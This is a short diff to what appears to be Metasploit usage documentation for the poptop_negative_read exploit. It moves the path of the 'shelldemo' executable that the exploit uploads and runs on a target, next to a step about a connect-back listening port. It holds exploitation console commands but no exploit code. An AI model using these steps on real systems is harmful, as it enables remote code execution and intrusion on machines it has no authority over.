@@ -56,8 +56,8 @@ Exploit and Payload Options
 
 7) Set the impurity executable to upload/execute
 
-msf poptop_negative_read > set PEXEC ./impurity/shelldemo
-PEXEC -> ./impurity/shelldemo
+msf poptop_negative_read > set PEXEC ./data/shelldemo
+PEXEC -> ./data/shelldemo
 
 8) Set the local port to connect back to (handler binds and listens, its magic)
 
